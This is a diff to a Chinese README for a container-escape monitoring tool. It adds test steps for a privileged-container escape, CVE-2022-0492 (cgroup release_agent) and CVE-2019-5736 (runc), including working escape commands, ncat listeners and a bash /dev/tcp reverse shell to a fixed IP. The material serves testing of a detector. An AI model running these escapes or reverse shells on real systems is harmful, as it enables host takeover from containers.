@@ -72,30 +72,92 @@ sudo apt install libseccomp-dev libseccomp2 seccomp
 
 ## 检测漏洞
 ### 1. 特权容器
-> 该逃逸不限docker和Linux内核版本
+> 该逃逸不限docker和Linux内核版本\
+> 参考：https://github.com/Metarget/metarget/blob/master/writeups_cnv/config-privileged-container
 
+使用main.py创建一个带特权的容器：
 ```shell
 sudo python3 main.py -a alert/intercept run -c "sudo docker run -itd --rm --name privileged_container --privileged ubuntu /bin/bash"
 ```
 
-监控程序启动后，运行容器的交互界面，并利用poc.sh实现特权容器逃逸。
-
+进入当前正在运行的容器，并实施逃逸攻击：
 ```shell
+# 进入容器
 sudo docker exec -it privileged_container /bin/bash
+# or
+sudo docker attach privileged_container
 
 # 容器内
 mkdir host
-mount /dev/sda1 /host   #/dev/sda1根据本机实际情况修改
+mount /dev/sda1 /host   #/dev/sda1根据本机实际情况修改，可用fdisk工具查看
 chroot /host
 ```
 
 ### 2. CVE-2022-0492
+> 测试版本：Linux kernel-5.8.0；docker-18.03.1\
+> 参考：https://github.com/Metarget/metarget/blob/master/writeups_cnv/kernel-cve-2022-0492
+
+使用main.py创建一个禁用了AppArmor和Seccomp的容器：
 ```shell
-sudo python3 main.py -a alert/intercept run -c "sudo docker run -itd --security-opt apparmor=unconfined --security-opt seccomp=unconfined --name=cve0492 --rm ubuntu /bin/bash"
+sudo python3 main.py -a alert/intercept run -c "sudo docker run -itd --name=cve4092 --security-opt apparmor=unconfined --security-opt seccomp=unconfined --name=cve0492 --rm ubuntu /bin/bash"
+
+```
+
+在接收反弹shell的主机上监听4444端口：
+```shell
+ncat -lvnp 4444
+```
+
+进入当前正在运行的容器，并实施逃逸攻击：
+```shell
+# 进入容器
+sudo docker exec -it cve0492 /bin/bash
+# or
+sudo docker attach cve0492
+
+# 容器内
+unshare -UrmC bash    # 这一步可以获取SYS_ADMIN权限
+mount -it cgroup -o rdma cgroup /mnt
+d=`dirname $(ls -x /mnt/r* |head -n1)`
+mkdir -p $d/w;echo 1 >$d/w/notify_on_release
+printf '#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.233.139/4444 0>&1' > /exp.sh; chmod 777 /exp.sh  # 此处IP地址为接收反弹shell的IP地址
+t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$t/exp.sh" > $d/release_agent
+sh -c "echo 0 >$d/w/cgroup.procs"
 
 ```
 
 ### 3. CVE-2019-5736
+> 测试版本：Linux kernel-5.8.0；docker-18.03.1\
+> 参考：https://github.com/Frichetten/CVE-2019-5736-PoC
+
+使用main.py启动一个容器：
 ```shell
 sudo python3 main.py -a alert/intercept run -c "sudo docker run -itd --name=cve5736 --rm ubuntu bash"
+```
+
+在接收反弹shell的主机上监听1234端口：
+```shell
+ncat -lvnp 1234
+```
+
+将漏洞利用程序拷贝进容器内，并进入容器：
+```shell
+# 拷贝漏洞利用程序进入容器内
+# 漏洞利用代码在vuls/cve-2019-5736/main.go，需修改payload中接收反弹shell的IP地址，编译后使用
+sudo docker cp main cve5736:/
+
+# 进入容器
+sudo docker exec -it cve5736 /bin/bash
+# or
+sudo docker attach cve5736
+
+# 容器内
+chmod +x main
+./main
+```
+
+另执行sh命令触发漏洞：
+```shell
+sudo docker exec cve5736 sh
 ```
